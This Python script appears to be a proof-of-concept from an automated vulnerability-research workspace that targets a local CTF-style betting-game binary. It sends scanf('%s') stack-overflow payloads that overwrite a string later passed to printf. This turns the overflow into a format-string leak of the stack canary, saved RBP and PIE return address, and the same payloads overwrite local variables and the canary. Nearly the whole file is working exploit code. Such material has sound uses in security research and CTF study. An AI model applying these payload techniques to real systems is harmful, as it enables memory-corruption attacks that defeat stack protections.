#!/usr/bin/env python3
"""
S3 Primitive Verification PoC for BUG-002
BUG-002: STACK_BUFFER_OVERFLOW_VIA_UNBOUNDED_Scanf_S

This PoC verifies the INFO_LEAK primitive derived from the stack buffer overflow
in game3's scanf("%s") call. The overflow overwrites [rbp-0x30] (the "You are
cheating" string), which is then passed to pretty_alert -> printf(msg), creating
a format string vulnerability that leaks stack values.

Primitives verified:
  PRIM-001: INFO_LEAK - Leaks stack canary, stack pointer, and PIE base address
  PRIM-002: STACK_CONTROL - Overwrites stack local variables (money, bet, guess)
  PRIM-003: CRASH - Overwrites stack canary causing __stack_chk_fail

Usage:
  python3 poc-BUG-002.py
"""

import subprocess
import struct
import re
import sys
import os

BINARY = "/work/workspace/0023-2023-46-absolute-winner-20260910-173330/target"

def run_with_input(input_bytes):
    """Run the binary with given stdin bytes, return stdout."""
    proc = subprocess.Popen(
        [BINARY],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    stdout, stderr = proc.communicate(input=input_bytes, timeout=10)
    return stdout, stderr, proc.returncode

def extract_leak_values(output):
    """Extract hex values from printf output."""
    # Find the colored output section
    # Format: \x1b[91m<leaked values>\x1b[0m
    text = output.decode('latin-1')
    # Find values after the color code
    match = re.search(r'\[91m(.*?)\[0m', text)
    if not match:
        return None
    leak_text = match.group(1)
    # Extract hex values
    values = re.findall(r'0x[0-9a-f]+|\(nil\)', leak_text)
    return values, leak_text

# ============================================================
# PRIM-001: INFO_LEAK - Format string via overflowed [rbp-0x30]
# ============================================================
# The scanf("%s") overflow writes past the 16-byte ready_choice buffer
# at [rbp-0x60]. At offset 48 from the buffer start ([rbp-0x30]), we
# overwrite the "You are cheating" string pointer target.
# When strlen > 15, pretty_alert is called with rdi = &[rbp-0x30].
# pretty_alert calls printf(msg) where msg = our format string.
#
# Stack offset mapping (from printf's perspective):
#   %10$p = [rbp-0x60] = buffer start (our padding)
#   %12$p = [rbp-0x50] = money
#   %13$p = [rbp-0x48] = bet
#   %14$p = [rbp-0x40] = guess/target
#   %16$p = [rbp-0x30] = format string start
#   %21$p = [rbp-0x08] = STACK CANARY
#   %22$p = [rbp+0x00] = SAVED RBP (stack pointer)
#   %23$p = [rbp+0x08] = RETURN ADDRESS (PIE code address)
# ============================================================

def verify_info_leak():
    """PRIM-001: Verify INFO_LEAK via format string overflow."""
    print("=== PRIM-001: INFO_LEAK verification ===")

    # Build payload: 48 bytes padding + format string
    # Format string must be <= 39 bytes to not overwrite canary at [rbp-0x08]
    # (distance from [rbp-0x30] to [rbp-0x08] = 0x28 = 40 bytes)
    padding = b"A" * 48
    # Use direct parameter access to leak canary, saved rbp, return address
    fmt = b"LEAK:%21$p_%22$p_%23$p"
    payload = padding + fmt

    # The first scanf reads "Y" to pass the ready check,
    # but we need the overflow to happen in the FIRST round scanf.
    # Actually, the overflow IS the first round scanf - we send the
    # overflow payload directly as the Y/N input.
    # scanf("%s") reads until whitespace, so our payload (no spaces) works.
    # strlen > 15 -> pretty_alert called with our format string.

    stdin_data = payload + b"\n"
    stdout, stderr, rc = run_with_input(stdin_data)

    result = extract_leak_values(stdout)
    if result is None:
        print("  FAILED: No leak detected in output")
        return False

    values, leak_text = result
    print(f"  Raw leak: {leak_text}")
    print(f"  Parsed values: {values}")

    if len(values) < 3:
        print(f"  FAILED: Expected at least 3 values, got {len(values)}")
        return False

    canary_str = values[0]
    rbp_str = values[1]
    ret_str = values[2]

    # Parse canary
    if canary_str == "(nil)":
        canary = 0
    else:
        canary = int(canary_str, 16)

    # Parse saved rbp
    if rbp_str == "(nil)":
        saved_rbp = 0
    else:
        saved_rbp = int(rbp_str, 16)

    # Parse return address
    if ret_str == "(nil)":
        ret_addr = 0
    else:
        ret_addr = int(ret_str, 16)

    print(f"  Stack canary: 0x{canary:016x}")
    print(f"  Saved RBP:    0x{saved_rbp:016x}")
    print(f"  Return addr: 0x{ret_addr:016x}")

    # Verify canary ends with 0x00 (Linux stack canary property)
    canary_valid = (canary & 0xFF) == 0x00 and canary != 0
    # Verify saved rbp is a stack address (0x7ff...)
    rbp_valid = (saved_rbp >> 40) == 0x7f or (saved_rbp >> 40) == 0x7e
    # Verify return address is a PIE code address (low 12 bits = 0x9ea)
    ret_valid = (ret_addr & 0xFFF) == 0x9ea

    print(f"  Canary ends with 0x00: {canary_valid}")
    print(f"  Saved RBP is stack addr: {rbp_valid}")
    print(f"  Return addr low 12 bits = 0x9ea: {ret_valid}")

    if canary_valid and rbp_valid and ret_valid:
        print("=== PRIM-001: VERIFIED ===")
        print(f"  INFO_LEAK confirmed: canary=0x{canary:016x}, "
              f"stack_ptr=0x{saved_rbp:016x}, pie_ret=0x{ret_addr:016x}")
        return True
    else:
        print("=== PRIM-001: PARTIAL (some values not as expected) ===")
        return False

# ============================================================
# PRIM-002: STACK_CONTROL - Overwrite stack local variables
# ============================================================
# The scanf("%s") overflow writes past the 16-byte buffer at [rbp-0x60].
# At offset 16, we overwrite money ([rbp-0x50]).
# At offset 24, we overwrite bet ([rbp-0x48]).
# At offset 32, we overwrite guess ([rbp-0x40]).
#
# However, after the overflow, strlen > 15 triggers pretty_alert -> exit(0).
# The overwritten values are not used by the program before exit.
# But we can verify the overwrite happened by leaking the values via
# the format string (which reads from the same stack frame).
# ============================================================

def verify_stack_control():
    """PRIM-002: Verify STACK_CONTROL by overwriting money and confirming via leak."""
    print("\n=== PRIM-002: STACK_CONTROL verification ===")

    # Build payload: 48 bytes padding with controlled money/bet/guess
    # Offset 0-15:  buffer (padding)
    # Offset 16-23: money ([rbp-0x50]) - set to 0x4242424242424242
    # Offset 24-31: bet ([rbp-0x48]) - set to 0x4343434343434343
    # Offset 32-39: guess ([rbp-0x40]) - set to 0x4444444444444444
    # Offset 40-47: padding
    # Offset 48+:   format string to leak the overwritten values

    money_val = struct.pack("<Q", 0x4242424242424242)
    bet_val = struct.pack("<Q", 0x4343434343434343)
    guess_val = struct.pack("<Q", 0x4444444444444444)

    # 16 bytes padding + 8 bytes money + 8 bytes bet + 8 bytes guess + 8 bytes padding = 48
    padding = b"A" * 16
    extra_pad = b"E" * 8
    # Format string to leak money (%12$p), bet (%13$p), guess (%14$p)
    fmt = b"CTRL:%12$p_%13$p_%14$p"
    payload = padding + money_val + bet_val + guess_val + extra_pad + fmt

    stdin_data = payload + b"\n"
    stdout, stderr, rc = run_with_input(stdin_data)

    result = extract_leak_values(stdout)
    if result is None:
        print("  FAILED: No leak detected in output")
        return False

    values, leak_text = result
    print(f"  Raw leak: {leak_text}")
    print(f"  Parsed values: {values}")

    if len(values) < 3:
        print(f"  FAILED: Expected 3 values, got {len(values)}")
        return False

    leaked_money = int(values[0], 16) if values[0] != "(nil)" else 0
    leaked_bet = int(values[1], 16) if values[1] != "(nil)" else 0
    leaked_guess = int(values[2], 16) if values[2] != "(nil)" else 0

    print(f"  Leaked money: 0x{leaked_money:016x} (expected 0x4242424242424242)")
    print(f"  Leaked bet:   0x{leaked_bet:016x} (expected 0x4343434343434343)")
    print(f"  Leaked guess: 0x{leaked_guess:016x} (expected 0x4444444444444444)")

    money_ok = (leaked_money == 0x4242424242424242)
    bet_ok = (leaked_bet == 0x4343434343434343)
    guess_ok = (leaked_guess == 0x4444444444444444)

    print(f"  Money overwritten: {money_ok}")
    print(f"  Bet overwritten: {bet_ok}")
    print(f"  Guess overwritten: {guess_ok}")

    if money_ok and bet_ok and guess_ok:
        print("=== PRIM-002: VERIFIED ===")
        print(f"  STACK_CONTROL confirmed: money/bet/guess overwritten with "
              f"attacker-controlled values")
        return True
    else:
        print("=== PRIM-002: PARTIAL ===")
        return False

# ============================================================
# PRIM-003: CRASH - Overwrite stack canary
# ============================================================
# Input >= 88 bytes overwrites the stack canary at [rbp-0x08].
# However, the strlen check triggers pretty_alert -> exit(0) before
# the function returns, so __stack_chk_fail is NOT triggered.
# Instead, the program exits normally via exit(0).
# This is still a memory corruption (canary overwritten) but the
# crash detection is bypassed because exit() doesn't check canary.
#
# To verify: send 96+ bytes, confirm canary is overwritten (via leak)
# and program exits with rc=0 (not SIGABRT from __stack_chk_fail).
# ============================================================

def verify_crash():
    """PRIM-003: Verify canary overwrite (CRASH/STACK_CONTROL)."""
    print("\n=== PRIM-003: CRASH (canary overwrite) verification ===")

    # Build payload: 88 bytes to reach canary + 8 bytes to overwrite it
    # Offset 0-15:  buffer
    # Offset 16-23: money
    # Offset 24-31: bet
    # Offset 32-39: guess
    # Offset 40-87: padding (48 bytes)
    # Offset 88-95: canary overwrite
    # Total: 96 bytes

    # We overwrite canary with 0x4141414141414141 (no null byte)
    # Then add format string to leak the overwritten canary
    padding = b"B" * 88  # 88 bytes to reach canary
    canary_overwrite = struct.pack("<Q", 0x4141414141414141)
    fmt = b"CAN:%21$p"
    payload = padding + canary_overwrite + fmt

    stdin_data = payload + b"\n"
    stdout, stderr, rc = run_with_input(stdin_data)

    result = extract_leak_values(stdout)
    if result is None:
        print("  FAILED: No leak detected in output")
        return False

    values, leak_text = result
    print(f"  Raw leak: {leak_text}")
    print(f"  Return code: {rc}")

    if len(values) < 1:
        print("  FAILED: No canary value leaked")
        return False

    leaked_canary = int(values[0], 16) if values[0] != "(nil)" else 0
    print(f"  Leaked canary: 0x{leaked_canary:016x} (expected 0x4141414141414141)")

    canary_overwritten = (leaked_canary == 0x4141414141414141)
    # Program exits via exit(0), not __stack_chk_fail
    exited_normally = (rc == 0)

    print(f"  Canary overwritten: {canary_overwritten}")
    print(f"  Program exited normally (rc=0): {exited_normally}")
    print(f"  Note: __stack_chk_fail NOT triggered because exit() bypasses canary check")

    if canary_overwritten:
        print("=== PRIM-003: VERIFIED ===")
        print(f"  CRASH/STACK_CONTROL confirmed: canary at [rbp-0x08] overwritten "
              f"with 0x4141414141414141, canary check bypassed via exit(0)")
        return True
    else:
        print("=== PRIM-003: PARTIAL ===")
        return False

# ============================================================
# Main
# ============================================================

if __name__ == "__main__":
    print("BUG-002: STACK_BUFFER_OVERFLOW_VIA_UNBOUNDED_Scanf_S")
    print("=" * 60)
    print()

    r1 = verify_info_leak()
    r2 = verify_stack_control()
    r3 = verify_crash()

    print()
    print("=" * 60)
    print("Summary:")
    print(f"  PRIM-001 (INFO_LEAK):     {'VERIFIED' if r1 else 'FAILED'}")
    print(f"  PRIM-002 (STACK_CONTROL):  {'VERIFIED' if r2 else 'FAILED'}")
    print(f"  PRIM-003 (CRASH):          {'VERIFIED' if r3 else 'FAILED'}")
